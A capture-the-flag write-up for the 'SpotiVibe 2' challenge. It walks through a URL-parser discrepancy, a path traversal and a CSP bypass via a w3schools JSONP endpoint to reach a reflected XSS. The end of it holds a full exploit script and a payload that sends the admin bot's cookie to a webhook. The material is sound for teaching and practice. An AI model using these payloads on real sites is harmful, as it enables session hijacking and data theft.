# SpotiVibe 2

Just because I didn't use the paid plan, now it's truly the best music app in the world!

## Writeup

On this second version of the SpotiVibe challenge we can see that a check has been implemented to fix the previous vulnerability:

```python
def is_valid_spotify_url(url):
    try:
        decoded = unquote(url)
        parsed = urlparse(decoded)
        
        if parsed.scheme not in ["http", "https"]:
            print("Protocol error", file=sys.stderr)
            return False

        if parsed.hostname != "open.spotify.com":
            print("Hostname error", file=sys.stderr)
            return False

        if not parsed.path.startswith("/embed/"):
            print("embed not found", file=sys.stderr)
            return False

        if '"' in decoded:
            print("\" detected", file=sys.stderr)
            return False
        
        print("All good :)", file=sys.stderr)
        return True

    except Exception as e:
        print(e, file=sys.stderr)
        return False
```

Now the application also checks that the scheme of the provided URL is either **http** or **https**, making the previous exploit no longer work.

As in the previous challenge, the flag is stored in a cookie of the **Admin** bot:

```python
await page.setCookie({
    "name": "flag",
    "value": FLAG,
    "path": "/",
    "httpOnly": False
})
```

It still has the `httpOnly` parameter set to **False**, allowing us to read this value using JavaScript, so the application remains vulnerable to an **XSS attack**.

A new feature has also been implemented. We are now able to search for a song in the `/dashboard` page. As we can see in this code snippet:

```python
@app.route("/dashboard")
def dashboard():

    if "user_id" not in session:
        return redirect(url_for("login"))

    search = request.args.get("search", "")

    conn = get_db()

    if search:
        print(f"%{search}%", file=sys.stderr)
        songs = conn.execute(
            "SELECT * FROM songs WHERE user_id = ? AND title LIKE ?",
            (session["user_id"], f"%{search}%")
        ).fetchall()
    else:
        songs = conn.execute(
            "SELECT * FROM songs WHERE user_id = ?",
            (session["user_id"],)
        ).fetchall()

    conn.close()

    return render_template(
        "dashboard.html",
        songs=songs,
        search=search
    )
```

If we take a look at `dashboard.html`, we can see that this time the `| safe` filter is used for the **search** parameter:

```html
{% extends "base.html" %}

{% block content %}


<script src="https://www.w3schools.com/lib/w3.js"></script>

<style nonce="{{ csp_nonce }}">
  @keyframes fadeDown {
    from {
      opacity: 0;
      transform: translateY(-18px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  @keyframes fadeLeft {
    from {
      opacity: 0;
      transform: translateX(-18px);
    }
    to {
      opacity: 1;
      transform: translateX(0);
    }
  }

  @keyframes fadeRight {
    from {
      opacity: 0;
      transform: translateX(18px);
    }
    to {
      opacity: 1;
      transform: translateX(0);
    }
  }

  .dashboard-link {
    display: inline-block;
    margin-bottom: 30px;
  }

  .search-form {
    display: flex;
    flex-direction: column;
    gap: 10px;
    margin-bottom: 30px;
  }

  .song-card {
    background: #222;
    padding: 15px;
    border-radius: 8px;
    margin-bottom: 10px;
    opacity: 0;
  }

  .animate-title {
    animation: fadeDown 0.6s ease;
  }

  .animate-search {
    animation: fadeDown 0.8s ease;
  }

  .animate-result {
    animation: fadeLeft 0.6s ease;
  }

  .animate-card {
    animation: fadeRight 0.5s ease forwards;
  }
  
  .song-list {
  list-style: none;
  padding: 0;
  margin-top: 20px;
}
</style>

<h2 id="dashboard-title">Your Dashboard</h2>

<div>
  <a class="dashboard-link" href="{{ url_for('add_song') }}">Add New Song</a>
</div>

<form method="GET" class="search-form" id="search-form">
  <input
      type="text"
      name="search"
      placeholder="Search songs..."
      value="{{ search }}"
  >
  <button type="submit">Search</button>
</form>

{% if search %}
<p id="search-result-text">Results for: <strong>{{ search | safe}}</strong></p>
{% endif %}

<ul class="song-list">
  {% for song in songs %}
  <li class="song-card">
    <a href="{{ url_for('song', song_id=song.id) }}">
      {{ song.title }}
    </a>
  </li>
  {% endfor %}
</ul>

<script nonce="{{ csp_nonce }}">
  document.addEventListener("DOMContentLoaded", function () {
    
    w3.addClass("#dashboard-title", "animate-title");
    w3.addClass("#search-form", "animate-search");

    const resultText = document.getElementById("search-result-text");
    if (resultText) {
      w3.addClass("#search-result-text", "animate-result");
    }

    const cards = document.querySelectorAll(".song-card");
    cards.forEach((card, index) => {
      setTimeout(() => {
        w3.addClass(card, "animate-card");
      }, index * 120);
    });
  });
</script>

{% endblock %}
```

So this time the **search** parameter is vulnerable to an **XSS attack**.

As before, we can use the `/add_song` endpoint to inject our malicious URL and then make the Admin bot visit the song page using the `/report` endpoint.

In this case, to bypass the validation we can abuse the differences between Python's `urlparse` and how browsers handle backslashes (`\`) in URLs.

An example payload would be the following:

```
http://localhost:5000\@open.spotify.com/embed/../../dashboard?search=
```

Python treats `\` literally, seeing `localhost:5000\` as a username and `open.spotify.com` as the host. Browsers, instead, normalize `\` to `/`, so they see `localhost:5000` as the host and `/@open.spotify.com/embed/` as the path.

This discrepancy exists because Python's `urlparse` follows **RFC 3986**, where `\` has no special meaning and is treated as a regular character. Browsers, on the other hand, follow the **WHATWG URL Standard**, which explicitly normalizes `\` to `/` in the scheme and authority components.

The `../../` then performs a **path traversal** to navigate from `/embed/` up to `/dashboard`, effectively redirecting the admin's browser to the XSS-vulnerable search page.

Unfortunately, it is not possible to exploit XSS directly, because of the CSP rules applied to the `/dashboard` page. As we can see in this code snippet:

```python
@app.after_request
def add_csp(response):
    nonce = getattr(g, "csp_nonce", "")

    if request.endpoint == "dashboard":
        csp = (
            "base-uri 'self'; "
            "object-src 'none'; "
            "form-action 'self'; "
            f"script-src 'self' 'nonce-{nonce}' https://www.w3schools.com; "
            f"style-src 'self' 'nonce-{nonce}'; "
        )

        response.headers["Content-Security-Policy"] = csp

    return response
```

The `script-src` directive only allows scripts that either have the correct `nonce` attribute or are loaded from `'self'` / `https://www.w3schools.com`. This means a simple inline injection like `<script>alert(1)</script>` would be **blocked** by the browser, since it lacks the required `nonce` and we have no way of knowing the server-generated nonce value.

However, `https://www.w3schools.com` is whitelisted in the CSP rules. This means any JavaScript loaded from that domain via a `<script src="...">` tag will be executed as trusted, even without a nonce.

This makes the application vulnerable to **CSP Bypass via JSONP on w3schools.com**. For a great deep dive into this technique, see [JSONPeek and CSP-B-Gone](https://www.blackhillsinfosec.com/jsonpeek-and-csp-b-gone/) by Black Hills Information Security.

The endpoint `https://www.w3schools.com/js/demo_jsonp2.php`, found via the [w3schools JSONP tutorial](https://www.w3schools.com/js/js_json_jsonp.asp), is a JSONP endpoint that reflects a `callback` parameter:

```
GET /js/demo_jsonp2.php?callback=ANYTHING
\u2192 ANYTHING({"name":"John", "age":30, "city":"New York"});
```

We use this to execute arbitrary JavaScript by setting the callback to:

```js
location=atob('BASE64_WEBHOOK_URL').concat(document.cookie)//
```

Where the `//` comments out the trailing JSON, making the response valid JS that redirects the browser to our webhook with the cookie appended.

Putting all the pieces together, our malicious URL to chain the vulnerabilities looks like this:

```
https://localhost:5000\@open.spotify.com/embed/../../dashboard?search=<script src=https://www.w3schools.com/js/demo_jsonp2.php?callback=location=atob('BASE64_WEBHOOK_URL').concat(document.cookie)//></script>
```

Here is a comprehensive diagram to understand the exploit chain:

```
Song page (/song/<id>)          \u2190 No CSP
  \u2514\u2500 <iframe src="crafted_url">
       \u2514\u2500 Browser navigates to: /dashboard?search=<script...>
            \u2514\u2500 {{ search | safe }} renders <script> tag
                 \u2514\u2500 JSONP from w3schools.com \u2192 location redirect
                      \u2514\u2500 Flag cookie sent to webhook
```

Here is a complete exploit script using a real webhook:

```python
#!/usr/bin/python3
import requests

ip = 'localhost'
port = 5000

ip = 'chall.k1nd4sus.it'
port = 30503

url = f"http://{ip}:{port}"

def register(s, username, password):
    data = {
        'username': username,
        'password': password,
    }

    req = s.post(url + '/register', data=data)
    return req.content

def login(s, username, password):
    data = {
        'username': username,
        'password': password,
    }

    req = s.post(url + '/login', data=data)
    return req.content

def add_song(s, title, spotify_url):
    data = {
        'title': title,
        'spotify_url': spotify_url
    }

    req = s.post(url + '/add_song', data=data)
    return req.status_code

def logout(s):
    req = s.get(url + '/logout')
    return req.content

def report(s, song_id):
    data = {
        'song_id': song_id
    }

    req = s.post(url + '/report', data=data)
    return req.content

def dashboard(s, search):
    data = {
        'search': search
    }

    req = s.get(url + '/dashboard', params=data)
    return req.content

if __name__ == '__main__':
    s = requests.Session()

    user = 'contr0l'
    pw = 'password_101'

    #logout(s)
    register(s, user, pw)
    login(s, user, pw)

    title = 'exploit'

    spotify_url = r"""http://chall.k1nd4sus.it:30503\@open.spotify.com/embed/../../dashboard?search=%3Cscript%20src=https://www.w3schools.com/js/demo_jsonp2.php?callback=location=atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvZTJhNTg4Y2UtM2QyMS00MzAxLWFiZjktMGZjNGVmYjhmNGMwP2M9').concat(document.cookie)//%3E%3C/script%3E"""
    
    add_song(s, title, spotify_url)
    report(s, 1)
```

If we check the webhook website, we will see a new GET request with the following flag as a URL parameter:

```
flag=KSUS{61592b2c5b7175ebe1da5f799285a3b3}
```